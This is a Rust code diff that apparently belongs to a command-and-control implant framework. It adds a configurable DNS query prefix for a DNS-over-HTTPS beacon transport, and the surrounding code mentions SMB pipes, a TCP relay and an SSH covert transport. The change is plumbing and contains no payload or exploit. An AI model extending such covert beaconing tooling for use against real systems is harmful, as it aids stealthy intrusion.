@@ -346,6 +346,12 @@ pub struct MalleableProfile {
     /// TCP port for the local relay in `tcp_relay` mode.  Defaults to 4455.
     #[serde(default)]
     pub smb_tcp_relay_port: Option<u16>,
+    /// DNS query prefix used by the DoH transport when constructing beacon
+    /// and task queries.  Defaults to the compile-time random constant
+    /// `IOC_DNS_BEACON` generated per build.  When overridden, the same
+    /// value must be configured on the server's DoH listener.
+    #[serde(default = "default_dns_prefix")]
+    pub dns_prefix: String,
 }
 
 /// Authentication method for the SSH covert transport.
@@ -373,6 +379,9 @@ fn default_host_header() -> String {
 }
 fn default_doh_beacon_sentinel() -> String {
     "1.2.3.4".to_string()
+}
+fn default_dns_prefix() -> String {
+    crate::ioc::IOC_DNS_BEACON.to_string()
 }
 
 impl Default for MalleableProfile {
@@ -404,6 +413,7 @@ impl Default for MalleableProfile {
             smb_pipe_name: None,
             smb_pipe_mode: None,
             smb_tcp_relay_port: None,
+            dns_prefix: default_dns_prefix(),
         }
     }
 }
